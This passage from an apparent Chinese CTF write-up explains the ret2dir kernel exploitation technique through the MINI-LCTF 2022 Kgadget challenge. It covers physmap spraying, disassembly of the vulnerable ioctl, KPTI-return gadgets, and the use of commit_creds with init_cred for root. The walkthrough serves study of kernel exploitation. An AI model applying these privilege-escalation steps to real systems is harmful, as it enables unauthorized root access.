class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br><br><br>====================================================<br>Complete virtual memory map with 5-level page tables<br>====================================================<br></code></pre></td></tr></table></figure>



<p>我们可以看到这一行</p>
<pre><code class="hljs"> ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
</code></pre>
<p>这里我们通过后面的内存段解释可以知道，他是映射了整个物理地址<br>而这里还有个点就是，再Linux内核当中，分配内存通常有以下两种方式：</p>
<ol>
<li>vmalloc, 这里按照页为单位分配，需要虚拟地址连续，物理地址不需要连续</li>
<li>kmalloc, 这里按照字节为单位分配，虚拟地址和物理地址都需要连续</li>
</ol>
<p>而我们通常采用kmalloc进行分配。<br>因此，此时的内存就存在以下的情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/d788d43f8794a4c226dfe3e34bf41bd5ac6e397d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>在早期，我们的physmap是可执行的，所以我们可以在用户态编写好shellcode，然后在内核态劫持程序流到此就可以实现我们想得到的操作，但是目前的话我们的physmap一般都设置为不可执行，因此我们就无法通过shellcode的方式，但是我们仍然可以通过ROP来得到我们想要的结果<br>所以我们目前的利用手法就是如下：</p>
<ol>
<li>在用户态使用mmap来大量映射进行堆喷，这里咱们申请的越多，我们在物理内存当中使用的地址就会越大，而后我们在内核态也能更快的得到我们所期待的重合段</li>
<li>然后我们在内核态利用漏洞获得堆上的地址，也就是<code>kmalloc</code>后获取到的<code>slab</code>的地址，然后计算出physmap的地址</li>
<li>利用ROP劫持执行流到physmap上面</li>
</ol>
<p>通过上面的手法，我们就可以避开传统的内核访问用户但是被隔绝的情况，此时我们相当于是直接操作物理内存</p>
<h2 id="1-例题MINI-LCTF-2022-Kgadget"><a href="#1-例题MINI-LCTF-2022-Kgadget" class="headerlink" title="1.例题MINI-LCTF-2022 Kgadget"></a>1.例题MINI-LCTF-2022 Kgadget</h2><p>[md]这里我就奉行拿来主义，给出arttnba3师傅出的题，如有冒犯立马删（胆小</p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">ret2dir例题</a></p>
<p>拿到题第一步，首先咱们解压了看看</p>
<pre><code class="hljs"> tar -Jxf kgadget.tar.xzf
</code></pre>
<p>这个XZ文件有两种解压方式，还有一种就是先解压成tar，再解压tar<br>然后我们获取到文件系统后先来看看init脚本</p>
<pre><code class="hljs">  1 #!/bin/sh
  2 chown -R 0:0 /
  3 mount -t tmpfs tmpfs /tmp
  4 mount -t proc none /proc
  5 mount -t sysfs none /sys
  6 mount -t devtmpfs devtmpfs /dev
  7 
  8 echo 1 &gt; /proc/sys/kernel/dmesg_restrict
  9 echo 1 &gt; /proc/sys/kernel/kptr_restrict
 10 
 11 chown 0:0 /flag
 12 chmod 400 /flag
 13 chmod 777 /tmp
 14 
 15 insmod kgadget.ko
 16 chmod 777 /dev/kgadget
 17 
 18 cat /root/banner
 19 echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot;
 20 setsid cttyhack setuidgid 1000 sh                                                                                                                                                                                                
 21 poweroff -d 0 -f
</code></pre>
<h2 id="2-IDA逆向"><a href="#2-IDA逆向" class="headerlink" title="2.IDA逆向"></a>2.IDA逆向</h2><p>可以看到其中insmod了一个<code>kgadget.ko</code>，这儿也是咱们的漏洞模块,首先我们使用checksec来查看一下该模块<br><img src="http://imgsrc.baidu.com/forum/pic/item/29381f30e924b8990b9379f02b061d950b7bf64f.jpg" srcset="/img/loading.gif" lazyload><br>然后我们拖入IDA进行静态分析，首先就是ioctl函数<br><img src="http://imgsrc.baidu.com/forum/pic/item/a686c9177f3e67098b9646377ec79f3df9dc5567.jpg" srcset="/img/loading.gif" lazyload><br>可以看到这里咱们其实编译会出点问题，所以我们到汇编这里查看</p>
<pre><code class="hljs">.text.unlikely:000000000000011C 48 8B 1A                      mov     rbx, [param]                    ; 我们传递的函数param
.text.unlikely:000000000000011F                               kgadget_ptr = rbx                       ; void (*)(void)
.text.unlikely:000000000000011F 48 C7 C7 70 03 00 00          mov     __file, offset unk_370
.text.unlikely:0000000000000126 48 89 DE                      mov     cmd, kgadget_ptr
.text.unlikely:0000000000000129 E8 2A 0F 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000129
.text.unlikely:000000000000012E 48 C7 C7 A0 03 00 00          mov     rdi, offset unk_3A0
.text.unlikely:0000000000000135 E8 1E 0F 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000135
.text.unlikely:000000000000013A 48 89 65 E8                   mov     [rbp-18h], rsp
.text.unlikely:000000000000013E 48 8B 45 E8                   mov     rax, [rbp-18h]
.text.unlikely:0000000000000142 48 C7 C7 F8 03 00 00          mov     rdi, offset byte_3F8
.text.unlikely:0000000000000149 48 05 00 10 00 00             add     rax, 1000h
.text.unlikely:000000000000014F 48 25 00 F0 FF FF             and     rax, 0FFFFFFFFFFFFF000h         ; rax此时为内核栈的栈底，也就是最高处
.text.unlikely:0000000000000155 48 8D 90 58 FF FF FF          lea     rdx, [rax-0A8h]                 ; 此时将距离栈底0xA8的位置传入rdx,该rdx所在的地址将会作为一个中断栈，保存中断的寄存器值
.text.unlikely:000000000000015C 48 89 55 E8                   mov     [rbp-18h], rdx
.text.unlikely:0000000000000160                               regs = rdx                              ; pt_regs *
.text.unlikely:0000000000000160 48 BA 61 72 74 74 6E 62 61 33 mov     regs, 3361626E74747261h         ; 无效值
.text.unlikely:000000000000016A 48 89 90 58 FF FF FF          mov     [rax-0A8h], rdx                 ; r15
.text.unlikely:0000000000000171 48 89 90 60 FF FF FF          mov     [rax-0A0h], rdx                 ; r14
.text.unlikely:0000000000000178 48 89 90 68 FF FF FF          mov     [rax-98h], rdx                  ; r13
.text.unlikely:000000000000017F 48 89 90 70 FF FF FF          mov     [rax-90h], rdx                  ; r12
.text.unlikely:0000000000000186 48 89 90 78 FF FF FF          mov     [rax-88h], rdx                  ; rbp
.text.unlikely:000000000000018D 48 89 50 80                   mov     [rax-80h], rdx                  ; rbx
.text.unlikely:0000000000000191 48 89 50 90                   mov     [rax-70h], rdx                  ; r10
.text.unlikely:0000000000000195 E8 BE 0E 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000195
.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode
</code></pre>
<p>可以看到一个<code>pt_regs</code> 结构体，我们在这里查看一下这个结构体的含义</p>
<pre><code class="hljs">struct pt_regs &#123;
/*
 * C ABI says these regs are callee-preserved. They aren&#39;t saved on kernel entry
 * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.
 */
        unsigned long r15;
        unsigned long r14;
        unsigned long r13;
        unsigned long r12;
        unsigned long rbp;
        unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
        unsigned long r11;
        unsigned long r10;
        unsigned long r9;
        unsigned long r8;
        unsigned long rax;
        unsigned long rcx;
        unsigned long rdx;
        unsigned long rsi;
        unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it&#39;s IRQ number:
 */
        unsigned long orig_rax;
/* Return frame for iretq */
        unsigned long rip;
        unsigned long cs;
        unsigned long eflags;
        unsigned long rsp;
        unsigned long ss;
/* top of stack page */
&#125;;
</code></pre>
<p>由于这里我曾经写过操作系统，所以这里的结构体一眼可以看出是中断发生时所保存的寄存器结构，他是被压在内核栈当中的，然后我们的ioctl函数实际上是将r15~r12、rbp、rbx以及r10置为了无效值，仅仅保留了几个关键寄存器值。<br>然后最后一条语句</p>
<pre><code class="hljs">.text.unlikely:0000000000000195
.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode
</code></pre>
<p>这里是编译器的优化，实际上等同于<code>call rbx</code>, 而rbx种我们保存的是我们刚刚传递的函数<br>我们分析完ioctl，我们来看看qemu的启动脚本</p>
<pre><code class="hljs">  1 #!/bin/sh
  2 qemu-system-x86_64 \
  3   -m 256M \
  4   -cpu kvm64,+smep,+smap \
  5   -smp cores=2,threads=2 \
  6   -kernel bzImage \
  7   -initrd ./rootfs.cpio \
  8   -nographic \
  9   -monitor /dev/null \
 10   -snapshot \
 11   -append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \                                                                                                                                                              
 12   -no-reboot
</code></pre>
<h2 id="3-前期准备"><a href="#3-前期准备" class="headerlink" title="3.前期准备"></a>3.前期准备</h2><p>我们可以看到这里是开启了smep和smap，阻隔了内核访问用户数据或代码，还有就是nokalsr，说明我们可以通过vmlinux来获取关键函数的地址<br>首先我们目前是只拥有<code>bzImage</code>，因此我们通过下面脚本来获取其中的<code>vmlinux</code>，然后来获取关键函数地址</p>
<ul>
<li>这里获取vmlinux有两种方法，其中之一就是下面的<code>extract-vmlinux</code>脚本，不过有的地方会有不同程度的失败，要么是无法真正解压，要么是解压出来没有符号表</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/sh</span><br>	<span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0-only</span><br>	<span class="hljs-comment"># ----------------------------------------------------------------------</span><br>	<span class="hljs-comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># Inspired from extract-ikconfig</span><br>	<span class="hljs-comment"># (c) 2009,2010 Dick Streefland &lt;[url=mailto:dick@streefland.net]dick@streefland.net[/url]&gt;</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># (c) 2011      Corentin Chary &lt;[url=mailto:corentin.chary@gmail.com]corentin.chary@gmail.com[/url]&gt;</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># ----------------------------------------------------------------------</span><br>	<br>	check_vmlinux()<br>	&#123;<br>	    <span class="hljs-comment"># Use readelf to check if it&#x27;s a valid ELF</span><br>	    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span><br>	    <span class="hljs-comment">#       and not just an elf</span><br>	    readelf -h $<span class="hljs-number">1</span> &gt; /dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>	<br>	    cat $<span class="hljs-number">1</span><br>	    exit <span class="hljs-number">0</span><br>	&#125;<br>	<br>	try_decompress()<br>	&#123;<br>	    <span class="hljs-comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br>	    <span class="hljs-comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br>	<br>	    <span class="hljs-comment"># Try to find the header ($1) and decompress from here</span><br>	    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> `tr <span class="hljs-string">&quot;$1\n$2&quot;</span> <span class="hljs-string">&quot;\n$2=&quot;</span> &lt; <span class="hljs-string">&quot;$img&quot;</span> | grep -abo <span class="hljs-string">&quot;^$2&quot;</span>`<br>	    do<br>	        pos=$&#123;pos%%:*&#125;<br>	        tail -c+$pos <span class="hljs-string">&quot;$img&quot;</span> | $<span class="hljs-number">3</span> &gt; $tmp <span class="hljs-number">2</span>&gt; /dev/null<br>	        check_vmlinux $tmp<br>	    done<br>	&#125;<br>	<br>	<span class="hljs-comment"># Check invocation:</span><br>	me=$&#123;<span class="hljs-number">0</span><span class="hljs-comment">##*/&#125;</span><br>	img=$<span class="hljs-number">1</span><br>	<span class="hljs-keyword">if</span>  [ $<span class="hljs-comment"># -ne 1 -o ! -s &quot;$img&quot; ]</span><br>	then<br>	    echo <span class="hljs-string">&quot;Usage: $me &lt;kernel-image&gt;&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br>	    exit <span class="hljs-number">2</span><br>	fi<br>	<br>	<span class="hljs-comment"># Prepare temp files:</span><br>	tmp=$(mktemp /tmp/vmlinux-XXX)<br>	trap <span class="hljs-string">&quot;rm -f $tmp&quot;</span> <span class="hljs-number">0</span><br>	<br>	<span class="hljs-comment"># That didn&#x27;t work, so retry after decompression.</span><br>	try_decompress <span class="hljs-string">&#x27;\037\213\010&#x27;</span> xy    gunzip<br>	try_decompress <span class="hljs-string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz<br>	try_decompress <span class="hljs-string">&#x27;BZh&#x27;</span>          xy    bunzip2<br>	try_decompress <span class="hljs-string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma<br>	try_decompress <span class="hljs-string">&#x27;\211\114\132&#x27;</span> xy    <span class="hljs-string">&#x27;lzop -d&#x27;</span><br>	try_decompress <span class="hljs-string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="hljs-string">&#x27;lz4 -d&#x27;</span><br>	try_decompress <span class="hljs-string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd<br>	<br>	<span class="hljs-comment"># Finally check for uncompressed images or objects:</span><br>	check_vmlinux $img<br>	<br>	<span class="hljs-comment"># Bail out:</span><br>	echo <span class="hljs-string">&quot;$me: Cannot find vmlinux.&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>另外一种方法就是使用比较完善的<code>vmlinux-to-elf</code>，具体github地址如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a></p>
</blockquote>
<p>下)面我们获取两个函数的地址：</p>
<pre><code class="hljs">ffffffff810c92e0 &lt;commit_creds&gt;:
ffffffff810c9540 &lt;prepare_kernel_cred&gt;:
</code></pre>
<p>大家应该还记得咱们提权的方法吧，那就是想办法执行<code>commit_creds(prepare_kernel_cred(NULL))</code>,将内核权限赋予新进程</p>
<p>回顾我们上面的利用手法，我们需要再用户程序申请大量的内存来增加我们再内核态找到对应物理内存的几率，因此我们再C用户程序种使用<code>mmap</code>函数来进行匿名内存映射：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">map_spray</span>[<span class="hljs-number">0</span>] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>

<p>现在我们还需要找到一些gadget来进行我们的利用</p>
<p>如同之前内核ROP，我们同样需要找到<code>swapgs</code>、<code>iretq</code>等语句,但是本题的启动脚本我们可以发现开启了kpti，这导致我们在构造返回用户态的时候需要修改cr3寄存器，也就是改一下我们的页表地址，因此我们可以利用下面我们获得到的一个内核函数，该函数就包括了咱们<code>swapgs;ireq;</code>这样的指令，但是这里注意，整个函数可以用下面的形式来表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">swapgs;<br>pop;<br>pop;<br>iretq;<br></code></pre></td></tr></table></figure>

<p>所以说我们构造ROP链的时候需要加两个padding：）</p>
<p><code>swapgs_restoer_regs_and_return_to_usermode</code>,如下：</p>
<pre><code class="hljs">.text:FFFFFFFF81C00FB0                               public swapgs_restore_regs_and_return_to_usermode
.text:FFFFFFFF81C00FB0                               swapgs_restore_regs_and_return_to_usermode proc near
.text:FFFFFFFF81C00FB0                                                                       ; CODE XREF: ret_from_fork+15↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+54↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+65↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+74↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+87↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+94↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+A3↑j
.text:FFFFFFFF81C00FB0                                                                       ; error_return+E↓j
.text:FFFFFFFF81C00FB0                                                                       ; asm_exc_nmi+93↓j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSENTER_compat_after_hwframe+4F↓j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_compat_after_hwframe+47↓j
.text:FFFFFFFF81C00FB0                                                                       ; entry_INT80_compat+85↓j
.text:FFFFFFFF81C00FB0                                                                       ; DATA XREF: print_graph_irq+D↑o
.text:FFFFFFFF81C00FB0                                                                       ; print_graph_entry+59↑o
.text:FFFFFFFF81C00FB0 90                            nop                                     ; Alternative name is &#39;__irqentry_text_end&#39;
.text:FFFFFFFF81C00FB1 90                            nop
.text:FFFFFFFF81C00FB2 90                            nop
.text:FFFFFFFF81C00FB3 90                            nop
.text:FFFFFFFF81C00FB4 90                            nop
.text:FFFFFFFF81C00FB5 41 5F                         pop     r15
.text:FFFFFFFF81C00FB7 41 5E                         pop     r14
.text:FFFFFFFF81C00FB9 41 5D                         pop     r13
.text:FFFFFFFF81C00FBB 41 5C                         pop     r12
.text:FFFFFFFF81C00FBD 5D                            pop     rbp
.text:FFFFFFFF81C00FBE 5B                            pop     rbx
.text:FFFFFFFF81C00FBF 41 5B                         pop     r11
.text:FFFFFFFF81C00FC1 41 5A                         pop     r10
.text:FFFFFFFF81C00FC3 41 59                         pop     r9
.text:FFFFFFFF81C00FC5 41 58                         pop     r8
.text:FFFFFFFF81C00FC7 58                            pop     rax
.text:FFFFFFFF81C00FC8 59                            pop     rcx
.text:FFFFFFFF81C00FC9 5A                            pop     rdx
.text:FFFFFFFF81C00FCA 5E                            pop     rsi                             ;直到这里可以发现咱们是在主动恢复一些当时中断保存的pt_regs寄存器组
.text:FFFFFFFF81C00FCB 48 89 E7                      mov     rdi, rsp                        ;我们可以跳过这些寄存器直接开整
.text:FFFFFFFF81C00FCE 65 48 8B 24 25 04 60 00 00    mov     rsp, gs:qword_6004
.text:FFFFFFFF81C00FD7 FF 77 30                      push    qword ptr [rdi+30h]
.text:FFFFFFFF81C00FDA FF 77 28                      push    qword ptr [rdi+28h]
.text:FFFFFFFF81C00FDD FF 77 20                      push    qword ptr [rdi+20h]
.text:FFFFFFFF81C00FE0 FF 77 18                      push    qword ptr [rdi+18h]
.text:FFFFFFFF81C00FE3 FF 77 10                      push    qword ptr [rdi+10h]
.text:FFFFFFFF81C00FE6 FF 37                         push    qword ptr [rdi]
.text:FFFFFFFF81C00FE8 50                            push    rax
.text:FFFFFFFF81C00FE9 EB 43                         jmp     short loc_FFFFFFFF81C0102E
...........
.text:FFFFFFFF81C0102E                               loc_FFFFFFFF81C0102E:                   ; CODE XREF: swapgs_restore_regs_and_return_to_usermode+39↑j
.text:FFFFFFFF81C0102E 58                            pop     rax                             ;这里pop了两个值，所以需要在ROP种填充
.text:FFFFFFFF81C0102F 5F                            pop     rdi
.text:FFFFFFFF81C01030 0F 01 F8                      swapgs
.text:FFFFFFFF81C01033 FF 25 47 8D E4 00             jmp     cs:off_FFFFFFFF82A49D80
</code></pre>
<p>从这个名字也可以看出他是为了在中断例程结束后，从内核态返回用户态时所调用的函数，他首先会pop大量的寄存器来还原当时的环境，这里我们并不需要，所以我们需要的开始执行的地址就从<code>0xFFFFFFFF81C00FCB</code>进行咱们的利用，从这力同样可以返回用户态，因此这就是我们所需要的。</p>
<p>这里还有一点就是该<code>vmlinux</code>中并没有发现<code>mov rdi rax;</code>的指令，因此我们实现<code>commit_creds(prepare_kernel_cred(NULL))</code>有点困难，因此我们要利用到一个小知识点，那就是内核运行过程中会存在一个结构体<code>init_cred</code>,他表示root权限的结构体，因此我们改为实现<code>commit_creds(init_cred)</code>,找到结果如下：</p>
<pre><code class="hljs">ffffffff810c9640:       f0 ff 05 b9 20 9a 01    lock inc DWORD PTR [rip+0x19a20b9]        # ffffffff82a6b700 &lt;init_cred&gt;
</code></pre>
<h2 id="4-利用步骤"><a href="#4-利用步骤" class="headerlink" title="4.利用步骤"></a>4.利用步骤</h2><p>一些基本的gadget找到后我们如何让程序运行呢，这里我们来梳理一下本题中的关键点：</p>
<ul>
<li><code>ioctl</code>系统调用会执行我们传入的函数指针，但是这里只能传递内核的函数指针，由于开启了SMAP&#x2F;SMEP所以会有访问控制</li>
